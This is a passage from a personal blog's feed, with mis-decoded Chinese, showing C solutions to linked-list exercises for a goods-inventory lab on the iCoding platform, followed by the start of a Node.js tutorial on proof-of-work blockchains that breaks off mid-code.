title="é“¾è¡¨ï¼š07-æ˜¾ç¤ºå•ä¸ªèŠ‚ç‚¹"></a>é“¾è¡¨ï¼š07-æ˜¾ç¤ºå•ä¸ªèŠ‚ç‚¹</h3><blockquote><p>å‡½æ•°åŸå‹ï¼švoid output_one_item(GoodsList *p)ï¼Œå‡½æ•°æ˜¾ç¤ºç»“ç‚¹ä¸º p çš„å•†å“ä¿¡æ¯ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">output_one_item</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_id);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_price);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_discount);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_amount);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_remain);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š08-æ˜¾ç¤ºæ‰€æœ‰èŠ‚ç‚¹"><a href="#é“¾è¡¨ï¼š08-æ˜¾ç¤ºæ‰€æœ‰èŠ‚ç‚¹" class="headerlink" title="é“¾è¡¨ï¼š08-æ˜¾ç¤ºæ‰€æœ‰èŠ‚ç‚¹"></a>é“¾è¡¨ï¼š08-æ˜¾ç¤ºæ‰€æœ‰èŠ‚ç‚¹</h3><blockquote><p>å‡½æ•°åŸå‹ï¼švoid output_all_items(GoodsList *L)ï¼Œ</p><p>Lä¸ºæŒ‡é’ˆé“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆï¼Œoutput_all_items è°ƒç”¨ output_one_item å‡½æ•°ï¼Œå°†é“¾è¡¨ä¸­æ‰€æœ‰çš„å•†å“ä¿¡æ¯ä»¥æ ¼å¼åŒ–çš„æ–¹å¼æ‰“å°è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">output_all_items</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    GoodsList *Cur = L-&gt;next;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        output_one_item(Cur);<br>        Cur = Cur-&gt;next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š09-é‡Šæ”¾é“¾è¡¨"><a href="#é“¾è¡¨ï¼š09-é‡Šæ”¾é“¾è¡¨" class="headerlink" title="é“¾è¡¨ï¼š09-é‡Šæ”¾é“¾è¡¨"></a>é“¾è¡¨ï¼š09-é‡Šæ”¾é“¾è¡¨</h3><blockquote><p>å‡½æ•°åŸå‹ï¼švoid destory_list(GoodsList **L)ï¼Œ</p><p>è¯¥å‡½æ•°é‡Šæ”¾åŒ…æ‹¬å¤´ç»“ç‚¹åœ¨å†…çš„æ‰€æœ‰ç»“ç‚¹ï¼Œå®ŒæˆåæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆä¸ºNULLã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    GoodsList *Cur = *pL, *Des;<br>    <span class="hljs-keyword">while</span> (Cur-&gt;next)<br>    &#123;<br>        Des = Cur-&gt;next;<br>        Cur-&gt;next = Des-&gt;next;<br>        <span class="hljs-built_in">free</span>(Des);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(*pL);<br>    (*pL) = <span class="hljs-literal">NULL</span>;<br>    CurrentCnt = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š10-é‡Šæ”¾é“¾è¡¨å¹¶åˆ é™¤æ–‡ä»¶"><a href="#é“¾è¡¨ï¼š10-é‡Šæ”¾é“¾è¡¨å¹¶åˆ é™¤æ–‡ä»¶" class="headerlink" title="é“¾è¡¨ï¼š10-é‡Šæ”¾é“¾è¡¨å¹¶åˆ é™¤æ–‡ä»¶"></a>é“¾è¡¨ï¼š10-é‡Šæ”¾é“¾è¡¨å¹¶åˆ é™¤æ–‡ä»¶</h3><blockquote><p>å‡½æ•°åŸå‹ï¼švoid destory_list_and_file(GoodsList **L)ï¼Œ</p><p>è¯¥å‡½æ•°è°ƒç”¨destory_listé‡Šæ”¾åŒ…æ‹¬å¤´ç»“ç‚¹åœ¨å†…çš„æ‰€æœ‰ç»“ç‚¹ï¼Œå°†æŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆä¸ºNULLï¼Œæœ€ååˆ é™¤å­˜å‚¨å•†å“ä¿¡æ¯çš„æ–‡ä»¶goodinfo.txtã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list_and_file</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    destory_list(pL);<br>    remove(<span class="hljs-string">&quot;goodsinfo.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š11-ä¿å­˜æ–‡ä»¶"><a href="#é“¾è¡¨ï¼š11-ä¿å­˜æ–‡ä»¶" class="headerlink" title="é“¾è¡¨ï¼š11-ä¿å­˜æ–‡ä»¶"></a>é“¾è¡¨ï¼š11-ä¿å­˜æ–‡ä»¶</h3><blockquote><p>å‡½æ•°åŸå‹ï¼šint save_to_file(GoodsList *L)</p><p>å°†å½“å‰é“¾è¡¨æ‰€æœ‰çš„å•†å“ä¿¡æ¯ä¿å­˜åˆ°æ–‡ä»¶ goodsinfo.txt ä¸­ï¼Œå…¶ä¸­Lä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆï¼Œä¿å­˜æˆåŠŸåï¼Œè¯¥å‡½æ•°è¿”å›å•†å“çš„æ•°é‡ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">save_to_file</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!L)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    GoodsList *Cur = L-&gt;next;<br>    FILE *f = fopen(<span class="hljs-string">&quot;goodsinfo.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>); <span class="hljs-comment">// iCodingè²Œä¼¼è¯†åˆ«ä¸äº†GOODS_FILE_NAME</span><br>    <span class="hljs-type">int</span> counts = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (!f)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br><br>        <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;%s\t%s\t%d\t%s\t%d\t%d\n&quot;</span>,<br>                Cur-&gt;data.goods_id,<br>                Cur-&gt;data.goods_name,<br>                Cur-&gt;data.goods_price,<br>                Cur-&gt;data.goods_discount,<br>                Cur-&gt;data.goods_amount,<br>                Cur-&gt;data.goods_remain);<br><br>        Cur = Cur-&gt;next;<br>        counts++;<br>    &#125;<br><br>    fclose(f);<br>    f = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> counts;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š12-æ’åº"><a href="#é“¾è¡¨ï¼š12-æ’åº" class="headerlink" title="é“¾è¡¨ï¼š12-æ’åº"></a>é“¾è¡¨ï¼š12-æ’åº</h3><blockquote><p>å‡½æ•°åŸå‹ï¼švoid bubble_sort(GoodsList *L)</p><p>Lä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆï¼Œè¯¥å‡½æ•°åˆ©ç”¨å†’æ³¡æ’åºç®—æ³•ï¼ŒæŒ‰ä»·æ ¼ä»ä½åˆ°é«˜å¯¹å•†å“è¿›è¡Œæ’åºã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bubble_sort</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    GoodsList *Cur = L-&gt;next;<br>    GoodsInfo temp;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CurrentCnt - <span class="hljs-number">1</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; CurrentCnt - i; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (Cur-&gt;data.goods_price &gt; Cur-&gt;next-&gt;data.goods_price)<br>            &#123;<br>                temp = Cur-&gt;data;<br>                Cur-&gt;data = Cur-&gt;next-&gt;data;<br>                Cur-&gt;next-&gt;data = temp;<br>                <span class="hljs-comment">// output_all_items(L);</span><br>                <span class="hljs-comment">//  printf(&quot;\n&quot;);</span><br>            &#125;<br>            Cur = Cur-&gt;next;<br>        &#125;<br>        Cur = L-&gt;next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š13-è¯»å•†å“ä¿¡æ¯"><a href="#é“¾è¡¨ï¼š13-è¯»å•†å“ä¿¡æ¯" class="headerlink" title="é“¾è¡¨ï¼š13-è¯»å•†å“ä¿¡æ¯"></a>é“¾è¡¨ï¼š13-è¯»å•†å“ä¿¡æ¯</h3><blockquote><p>å‡½æ•°åŸå‹ï¼šGoodsInfo read_goods_info()</p><p>è¯¥å‡½æ•°è°ƒç”¨read_lineåŠscanfç­‰å‡½æ•°ï¼ŒæŒ‰â€œå•†å“IDã€å•†å“åç§°ã€å•†å“ä»·æ ¼ã€å•†å“æŠ˜æ‰£ã€å•†å“æ•°é‡ã€å•†å“å‰©ä½™æ•°é‡â€çš„é¡ºåºè®©ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†è¿™äº›ä¿¡æ¯ä¿å­˜åˆ° GoodsInfo ç»“æ„ä½“ä¸­ï¼Œå‡½æ•°æœ€åè¿”å›è¯¥ç»“æ„ä½“ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br>GoodsInfo <span class="hljs-title function_">read_goods_info</span><span class="hljs-params">()</span><br>&#123;<br>    GoodsInfo goods;<br>    read_line(goods.goods_id, MAX_ID_LEN);<br>    read_line(goods.goods_name, MAX_NAME_LEN);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_price);<br>    read_line(goods.goods_discount, MAX_DISCOUNT_LEN);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_amount);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_remain);<br>    <span class="hljs-keyword">return</span> goods;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>iCoding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Block Chain -- Proof Of Work</title>
    <link href="/posts/32752/"/>
    <url>/posts/32752/</url>
    
    <content type="html"><![CDATA[<h1 id="åŒºå—é“¾å…±è¯†æœºåˆ¶-POW-å·¥ä½œé‡è¯æ˜-Proof-Of-Work-å­¦ä¹ "><a href="#åŒºå—é“¾å…±è¯†æœºåˆ¶-POW-å·¥ä½œé‡è¯æ˜-Proof-Of-Work-å­¦ä¹ " class="headerlink" title="åŒºå—é“¾å…±è¯†æœºåˆ¶ - POW å·¥ä½œé‡è¯æ˜ Proof Of Work å­¦ä¹ "></a>åŒºå—é“¾å…±è¯†æœºåˆ¶ - POW å·¥ä½œé‡è¯æ˜ Proof Of Work å­¦ä¹ </h1><blockquote><p><strong>å·¥ä½œé‡è¯æ˜PoWï¼ˆProof of Workï¼‰</strong>ï¼Œé€šè¿‡ç®—åŠ›çš„æ¯”æ‹¼æ¥é€‰å–ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç”±è¯¥èŠ‚ç‚¹å†³å®šä¸‹ä¸€è½®å…±è¯†çš„åŒºå—å†…å®¹ï¼ˆè®°è´¦æƒï¼‰ã€‚PoWè¦æ±‚èŠ‚ç‚¹æ¶ˆè€—è‡ªèº«ç®—åŠ›å°è¯•ä¸åŒçš„éšæœºæ•°ï¼ˆnonceï¼‰ï¼Œä»è€Œå¯»æ‰¾ç¬¦åˆç®—åŠ›éš¾åº¦è¦æ±‚çš„å“ˆå¸Œå€¼ï¼Œä¸æ–­é‡å¤å°è¯•ä¸åŒéšæœºæ•°ç›´åˆ°æ‰¾åˆ°ç¬¦åˆè¦æ±‚ä¸ºæ­¢ï¼Œæ­¤è¿‡ç¨‹ç§°ä¸ºâ€œæŒ–çŸ¿â€ã€‚å…·ä½“çš„æµç¨‹å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://pic4.zhimg.com/80/v2-ace420259e494348c6d6407f3e1a90c7_720w.webp" alt="img"></p><p>ç¬¬ä¸€ä¸ªæ‰¾åˆ°åˆé€‚çš„nonceçš„èŠ‚ç‚¹è·å¾—è®°è´¦æƒã€‚èŠ‚ç‚¹ç”Ÿæˆæ–°åŒºå—åå¹¿æ’­ç»™å…¶ä»–èŠ‚ç‚¹ï¼Œå…¶ä»–èŠ‚ç‚¹å¯¹æ­¤åŒºå—è¿›è¡ŒéªŒè¯ï¼Œè‹¥é€šè¿‡éªŒè¯åˆ™æ¥å—è¯¥åŒºå—ï¼Œå®Œæˆæœ¬è½®å…±è¯†ï¼Œå¦åˆ™æ‹’ç»è¯¥åŒºå—ï¼Œç»§ç»­å¯»æ‰¾åˆé€‚çš„nonceã€‚</p><p>æ¥è‡ªâ€“<a href="https://zhuanlan.zhihu.com/p/367862889">ä¸€æ–‡è¯»æ‡‚ä¸»æµå…±è¯†æœºåˆ¶ï¼šPoWã€PoSå’ŒDPoS - çŸ¥ä¹ (zhihu.com)</a></p></blockquote><p>è¿™é‡Œé€šè¿‡<code>NodeJs</code>æ¥å®ç°â€“<a href="https://www.bilibili.com/video/BV14E411v7eS/?spm_id_from=333.788&vd_source=2c3bfa76e1e85787859b972cb7834a7c">ç¨‹åºå‘˜æ¥è®²è®²ä»€ä¹ˆæ˜¯åŒºå—é“¾ | å°ç™½ä¹Ÿèƒ½å¬æ‡‚çš„é€šä¿—è§£é‡Š | åŒºå—é“¾åŸç† | æ¯”ç‰¹å¸ | æ•°å­—è´§å¸_å“”å“©å“”å“©_bilibili</a></p><h2 id="1ã€ç®€æ˜“åŒºå—é“¾æ­å»º"><a href="#1ã€ç®€æ˜“åŒºå—é“¾æ­å»º" class="headerlink" title="1ã€ç®€æ˜“åŒºå—é“¾æ­å»º"></a>1ã€ç®€æ˜“åŒºå—é“¾æ­å»º</h2><p>åŒºå—é“¾ï¼Œé¡¾åæ€ä¹‰æ˜¯ç”±ä¸€ä¸ªä¸ªåŒºå—ç›¸è¿æ¥è€Œæˆç»„æˆçš„<strong>é“¾å¼ç»“æ„</strong></p><p>æ‰€ä»¥æˆ‘ä»¬å…ˆå®šä¹‰Chainå’ŒBlockç±»</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sha256 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js/sha256&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Block</span>&#123;<br>    <br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data, preHash</span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data <span class="hljs-comment">// åŒºå—å‚¨å­˜çš„æ•°æ®</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash <span class="hljs-comment">// å‚¨å­˜ä¸Šä¸€ä¸ªåŒºå—æ•°æ®çš„å“ˆå¸Œå€¼</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>() <span class="hljs-comment">// å½“å‰åŒºå—æ•°æ®çš„å“ˆå¸Œå€¼</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// ç”Ÿæˆè¯¥åŒºå—çš„Hash</span><br>    <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> +<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span><br>        ).<span class="hljs-title function_">toString</span>()<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Chain</span>&#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// ä¸€ä¸ªé“¾ä¸­åº”ç”±å¤šä¸ªåŒºå—ç»„æˆæ‰€ä»¥èµ‹å€¼æˆæ•°ç»„</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// ç”Ÿæˆèµ·å§‹åŒºé—´</span><br>    <span class="hljs-title function_">makeGenesis</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;Origin&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-comment">// èµ·å§‹åŒºå—ï¼Œç´¢å¼•ä¸º0ï¼Œæ‰€ä»¥preHashä¸º0</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(block1)<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—ï¼š</p><p><img src="/posts/32752/image-20231124142339969.png" alt="image-20231124142339969"></p><p>æ­¤æ—¶é“¾ä¸Šåªæœ‰<strong>èµ·å§‹åŒºå—</strong></p><p>é‚£è¦æŠŠæˆ‘ä»¬å®šä¹‰çš„<code>block1</code>åŠ åˆ°<code>fanChain</code>ä¸Šï¼Œå°±è¦åœ¨<code>chain</code>ä¸Šæ„é€ ç›¸åº”æ–¹æ³•</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 